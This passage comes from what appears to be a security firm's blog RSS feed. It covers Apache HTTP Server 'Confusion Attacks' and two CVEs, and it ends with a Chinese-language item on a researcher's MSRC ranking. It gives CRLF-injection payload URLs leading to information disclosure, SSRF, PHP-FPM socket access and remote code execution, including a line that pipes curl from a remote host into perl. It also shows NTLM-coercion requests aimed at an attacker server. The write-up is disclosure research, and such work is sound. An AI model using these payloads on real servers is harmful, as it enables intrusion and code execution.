    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd first creates&lt;sup&gt;[1]&lt;/sup&gt; a new request structure and copie&lt;sup&gt;[2]&lt;/sup&gt; the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; into it. After processing&lt;sub&gt;[3]&lt;/sub&gt; the lifecycle, it calls&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; â€” the place including the legacy transformation. So, &lt;strong&gt;in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd&lt;/strong&gt;. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and hereâ€™s a simple list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the responseâ€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; and part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;, here are two scenarios for reference:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.&lt;/li&gt;
  &lt;li&gt;SSRF that can completely control the response headers, such as a project hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; like &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;âœ”ï¸ 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Starting with invoking an arbitrary handler to disclose information, we use the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; handler in Apache HTTP Server, which is typically only allowed to be accessed locally:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the ability to invoke any handler, it becomes possible to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; to access sensitive information that should not be accessible remotely:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;âœ”ï¸ 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;Itâ€™s also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to execute embedded malicious code within the image, like:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;ï¸-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;âœ”ï¸ 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;Calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to access any protocol on any URL is, of course, straightforward:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; automatically adds an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; header, which gets blocked by EC2 and GCPâ€™s &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata protection mechanisms&lt;/a&gt;, otherwise, this would be an even more powerful primitive.&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;âœ”ï¸ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; offers a more â€œconvenientâ€ feature â€” it can access local Unix Domain Sockets! ğŸ˜‰&lt;/p&gt;

&lt;p&gt;Hereâ€™s a demonstration accessing PHP-FPMâ€™s local Unix Domain Socket to execute a PHP backdoor located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP/HTTPS protocols ğŸ˜) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-4-arbitrary-handler-to-rce&quot;&gt;âœ”ï¸ 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;Finally, letâ€™s demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;PHP Docker&lt;/a&gt; image includes PEAR, a command-line PHP package management tool, using its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; as an entry point allows us to achieve further exploitation. You can check this article â€” &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI Summary&lt;/a&gt;, written by &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; for details!&lt;/p&gt;

&lt;p&gt;Here we utilize a Command Injection within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; to complete the entire exploit chain, detailed as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Itâ€™s common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please donâ€™t forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-other-vulnerabilities&quot;&gt;ğŸ”¥ 4. Other Vulnerabilities&lt;/h3&gt;

&lt;p&gt;While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;âš”ï¸ CVE-2024-38472 - Windows UNC-based SSRF&lt;/h4&gt;

&lt;p&gt;Firstly, the Windows implementation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:&lt;/p&gt;

&lt;h5 id=&quot;ï¸-triggered-via-http-request-parser&quot;&gt;âœ”ï¸ Triggered via HTTP Request Parser&lt;/h5&gt;

&lt;p&gt;Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) or pairing with &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; can force Httpd to coerce NTLM authentication to an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt;, and practically, this SSRF can be converted into RCE through &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-triggered-via-type-map&quot;&gt;âœ”ï¸ Triggered via Type-Map&lt;/h5&gt;

&lt;p&gt;In the &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu&lt;/a&gt; distribution of Httpd, Type-Map is enabled by default:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By uploading a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; trick&lt;/a&gt; I proposed. ğŸ˜‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;âš”ï¸ CVE-2024-39573 - SSRF via Full Control of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; Prefix&lt;/h4&gt;

&lt;p&gt;Lastly, when you have full control over the prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; substitution target in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; is fully controllable, you can invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; and its sub-modules:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the following URL can delegate the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; for processing:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;future-works&quot;&gt;Future Works&lt;/h2&gt;

&lt;p&gt;Finally, letâ€™s talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe weâ€™ll see more â€œconfusionsâ€ in the future!&lt;/p&gt;

&lt;p&gt;So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.&lt;/p&gt;

&lt;p&gt;Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine â€” the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? Thatâ€™s your mission!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Angelboy å…¥åˆ—å¾®è»Ÿ MSRC 2024 å‰ç™¾å¤§æœ€æœ‰åƒ¹å€¼è³‡å®‰ç ”ç©¶å“¡ï¼</title>
                <description>&lt;p&gt;æ­å–œ DEVCORE è³‡æ·±è³‡å®‰ç ”ç©¶å“¡ Angelboy æ¦®ç² Microsoft çš„ MSRC 2024 Most Valuable Security Researchers çš„æ®Šæ¦®ï¼é™¤äº†åœ¨ä¸åˆ†é … TOP 100 åå–®ä¸­æ¦®ç² #33 åï¼Œåœ¨ Angelboy é•·å¹´ç ”ç©¶çš„ Windows é ˜åŸŸä¸­ï¼Œä»–æ›´ä»¥ #9 çš„åæ¬¡æ“ å…¥å‰åå¤§è¡Œåˆ—ã€‚&lt;/p&gt;

&lt;p&gt;é€™ä¸åƒ…æ˜¯ Angelboy é¦–æ¬¡ç™»ä¸Šè©²å¹´åº¦æ¦œå–®ï¼ŒåŒæ™‚ä¹Ÿæ˜¯è©²åå–®ä¸­æ’åæœ€é«˜çš„å°ç£è³‡å®‰ç ”ç©¶å“¡ã€‚&lt;/p&gt;

&lt;p&gt;Microsoft æ——ä¸‹çš„ Microsoft Security Response Centerï¼ˆMSRCï¼Œæˆ–ç¨± Microsoft å®‰å…¨æ€§å›æ‡‰ä¸­å¿ƒï¼‰é•·æœŸè—‰ Microsoft Researcher Recognition Programï¼ˆMRRRï¼‰è¨ˆç•«ï¼Œå…¬é–‹è¡¨æšå”åŠ© Microsoft æŒ–æ˜ç³»çµ±å®‰å…¨æ¼æ´çš„è³‡å®‰ç ”ç©¶å“¡ï¼Œä»¥æ­¤è‡´è¬å„ªç§€è³‡å®‰ç ”ç©¶å“¡ç‚º Microsoft çš„å®¢æˆ¶åŠç”¢å“å®‰å…¨æ‰€ä»˜å‡ºçš„åŠªåŠ›ã€‚&lt;/p&gt;

&lt;p&gt;Microsoft æ–¼ 7 æ—¥å…¬å¸ƒçš„ MSRC 2024 Most Valuable Security Researchers åå–®ï¼Œæ˜¯æ ¹æ“š 2023 å¹´ 7 æœˆè‡³ 2024 å¹´ 6 æœˆï¼Œå…¨çƒå„åœ°è³‡å®‰ç ”ç©¶å“¡å‘ MSRC å›å ±çš„æ¼æ´å¾—åˆ†æ‰€çµ±è¨ˆè€Œå¾—ã€‚åœ¨æ•´é«”ä¸åˆ†é …åå–®ä¸­ï¼ŒAngelboy ç²å¾—äº† #33 åçš„æ®Šæ¦®ã€‚è€Œé‡å° Microsoft æ——ä¸‹å„é¡å‹ç”¢å“çš„ Windows é¡åˆ¥ä¸­ï¼ŒAngelboy å‰‡å…¥åˆ— TOP 10ï¼Œç²å¾— #9 çš„æˆç¸¾ï¼Œä¸¦ç¶“èªè­‰å…¨æ•¸æ¼æ´å›å ±çš†ç‚ºæœ‰æ•ˆå›å ±ã€‚&lt;/p&gt;

&lt;p&gt;å†æ¬¡æ­å–œ Angelboy å¥ªå¾—æ­¤ä¸€æ®Šæ¦®ï¼&lt;/p&gt;

&lt;p&gt;åƒè€ƒè³‡æ–™ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
